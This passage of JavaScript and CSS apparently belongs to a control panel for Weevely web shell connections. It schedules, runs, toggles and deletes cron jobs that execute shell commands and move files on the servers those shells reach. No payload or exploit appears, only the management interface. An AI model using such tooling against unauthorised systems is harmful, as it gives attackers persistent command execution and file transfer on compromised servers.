                            <button class="btn btn-sm btn-${job.is_active ? 'warning' : 'success'}" 
                                    onclick="toggleCronJobTerminal(${job.id})" 
                                    title="${job.is_active ? 'Disable' : 'Enable'} Cron Job">
                                <i class="fas ${statusIcon} me-1"></i>
                                ${job.is_active ? 'Disable' : 'Enable'}
                            </button>
                            
                            <button class="btn btn-sm btn-outline-danger" onclick="deleteCronJobTerminal(${job.id})" title="Delete Cron Job">
                                <i class="fas fa-trash me-1"></i>Delete
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        `;
    });
    
    container.innerHTML = html;
}

function createCronJobTerminal() {
    const formData = {
        name: document.getElementById('cron_job_name_terminal').value,
        description: document.getElementById('cron_job_description_terminal').value,
        cron_expression: document.getElementById('cron_expression_terminal').value,
        timezone: 'UTC', // Default timezone
        job_type: document.getElementById('cron_job_type_terminal').value,
        weevely_connection_id: window.currentWeevelyConnection.id // set based on current connection
    };
    console.log("[+]formData's create cron:", formData);
    // Get job-specific data
    switch(formData.job_type) {
        case 'file_operation':
            formData.job_data = JSON.stringify({
                operation: document.getElementById('file_operation_terminal').value,
                source: document.getElementById('file_source_terminal').value,
                destination: document.getElementById('file_destination_terminal')?.value || null
            });
            break;
            
        case 'command':
            formData.job_data = JSON.stringify({
                command: document.getElementById('command_text_terminal').value
            });
            break;
            
        case 'download':
            formData.job_data = JSON.stringify({
                target_path: document.getElementById('download_path_terminal').value
            });
            break;
            
        case 'upload':
            formData.job_data = JSON.stringify({
                source_path: document.getElementById('upload_source_terminal').value,
                target_path: document.getElementById('upload_target_terminal').value
            });
            break;
    }
    
    // Validate required fields
    if (!formData.name || !formData.cron_expression || !formData.job_type || !formData.weevely_connection_id) {
        alert('Please fill in all required fields');
        return;
    }
    
    // Create cron job
    fetch('/api/weevely/cron-jobs', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(formData)
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            appendToTerminal(`Cron job "${formData.name}" created successfully!`, 'success');
            // Reset form
            document.getElementById('createCronJobFormTerminal').reset();
            document.getElementById('job_type_fields_terminal').innerHTML = '';
            // Refresh jobs list
            refreshCronJobsTerminal();
        } else {
            appendToTerminal(`Error creating cron job: ${data.error}`, 'error');
        }
    })
    .catch(error => {
        console.error('Error creating cron job:', error);
        appendToTerminal(`Error creating cron job: ${error.message}`, 'error');
    });
}

function executeCronJobNowTerminal(jobId) {
    if (!confirm('Execute this cron job now?')) return;
    
    fetch(`/api/weevely/cron-jobs/${jobId}/execute`, { method: 'POST' })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                appendToTerminal(`Cron job executed successfully!`, 'success');
                refreshCronJobsTerminal();
            } else {
                appendToTerminal(`Error executing cron job: ${data.error}`, 'error');
            }
        })
        .catch(error => {
            console.error('Error executing cron job:', error);
            appendToTerminal(`Error executing cron job: ${error.message}`, 'error');
        });
}

function toggleCronJobTerminal(jobId) {
    // Show loading state
    const button = event.target.closest('button');
    const originalContent = button.innerHTML;
    button.disabled = true;
    button.innerHTML = '<i class="fas fa-spinner fa-spin me-1"></i>Updating...';
    
    fetch(`/api/weevely/cron-jobs/${jobId}/toggle`, { method: 'POST' })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                const newStatus = data.is_active ? 'enabled' : 'disabled';
                const statusIcon = data.is_active ? 'fa-toggle-on text-success' : 'fa-toggle-off text-secondary';
                
                appendToTerminal(`✅ Cron job "${data.name}" ${newStatus} successfully!`, 'success');
                
                // Update button appearance immediately for better UX
                button.className = `btn btn-sm btn-${data.is_active ? 'warning' : 'success'}`;
                button.innerHTML = `<i class="fas ${statusIcon} me-1"></i>${data.is_active ? 'Disable' : 'Enable'}`;
                button.title = `${data.is_active ? 'Disable' : 'Enable'} Cron Job`;
                
                // Refresh the entire list to show updated status
                setTimeout(() => {
                    refreshCronJobsTerminal();
                }, 1000);
            } else {
                appendToTerminal(`❌ Error: ${data.error}`, 'error');
                // Restore button
                button.disabled = false;
                button.innerHTML = originalContent;
            }
        })
        .catch(error => {
            console.error('Error toggling cron job:', error);
            appendToTerminal(`❌ Error toggling cron job: ${error.message}`, 'error');
            // Restore button
            button.disabled = false;
            button.innerHTML = originalContent;
        });
}

function deleteCronJobTerminal(jobId) {
    if (!confirm('Delete this cron job?')) return;
    fetch(`/api/weevely/cron-jobs/${jobId}`, { method: 'DELETE' })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                appendToTerminal('Cron job deleted successfully', 'info');
                refreshCronJobsTerminal();
            } else {
                appendToTerminal(`Error deleting cron job: ${data.error}`, 'error');
            }
        })
        .catch(error => {
            console.error('Error deleting cron job:', error);
            appendToTerminal(`Error deleting cron job: ${error.message}`, 'error');
        });
}

// Function to load cron jobs for specific weevely connection
function loadWeevelyCronJobs(weevelyId, weevelyName) {
    appendToTerminal(`Loading cron jobs for ${weevelyName}...`, 'info');
    window.currentWeevelyConnection.id = weevelyId;
    
    // Switch to cron jobs tab
    const cronTab = document.getElementById('cron-jobs-tab');
    if (cronTab) {
        cronTab.click();
        // Refresh cron jobs list
        setTimeout(() => {
            refreshCronJobsTerminal();
        }, 500);
    }
}

// Add CSS for cron job styling
const cronJobStyles = `
<style>
/* Cron Job specific styling */
.cron-job-card {
  transition: all 0.3s ease;
  border-left: 4px solid transparent;
}

.cron-job-card:hover {
  transform: translateY(-2px);
  box-shadow: 0 4px 12px rgba(0,0,0,0.15);
}

.cron-job-card.border-success {
  border-left-color: #28a745;
}

.cron-job-card.border-secondary {
  border-left-color: #6c757d;
}

.cron-status-badge {
  font-size: 0.75rem;
  padding: 0.5rem 0.75rem;
  border-radius: 20px;
  font-weight: 600;
  letter-spacing: 0.5px;
}

.cron-info-row {
  background: rgba(255,255,255,0.05);
  border-radius: 6px;
  padding: 8px 12px;
  margin: 4px 0;
}

.cron-info-label {
  font-weight: 600;
  color: #adb5bd;
  font-size: 0.75rem;
  text-transform: uppercase;
  letter-spacing: 0.5px;
}

.cron-info-value {
  color: #f8f9fa;
  font-weight: 500;
}

.cron-schedule-code {
  background: rgba(0,123,255,0.1);
  border: 1px solid rgba(0,123,255,0.3);
  color: #007bff;
  padding: 2px 6px;
  border-radius: 4px;
  font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
  font-size: 0.8rem;
}

.cron-action-buttons {
  display: flex;
  flex-direction: column;
  gap: 0.5rem;
}

.cron-action-buttons .btn {
  min-width: 100px;
  font-size: 0.8rem;
  padding: 0.4rem 0.75rem;
}

/* Status indicator animations */
.status-active {
  animation: pulse-green 2s infinite;
}

.status-inactive {
  opacity: 0.7;
}

@keyframes pulse-green {
  0% { box-shadow: 0 0 0 0 rgba(40, 167, 69, 0.7); }
  70% { box-shadow: 0 0 0 10px rgba(40, 167, 69, 0); }
  100% { box-shadow: 0 0 0 0 rgba(40, 167, 69, 0); }
}

/* Loading states */
.btn-loading {
  position: relative;
  pointer-events: none;
}

.btn-loading::after {
  content: '';
  position: absolute;
  top: 50%;
  left: 50%;
  width: 16px;
  height: 16px;
  margin: -8px 0 0 -8px;
  border: 2px solid transparent;
  border-top: 2px solid currentColor;
  border-radius: 50%;
  animation: spin 1s linear infinite;
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}
</style>
`;

// Inject styles when DOM is loaded
document.addEventListener('DOMContentLoaded', function() {
    if (!document.getElementById('cron-job-styles')) {
        const styleElement = document.createElement('div');
        styleElement.id = 'cron-job-styles';
        styleElement.innerHTML = cronJobStyles;
        document.head.appendChild(styleElement);
    }
});
</script>
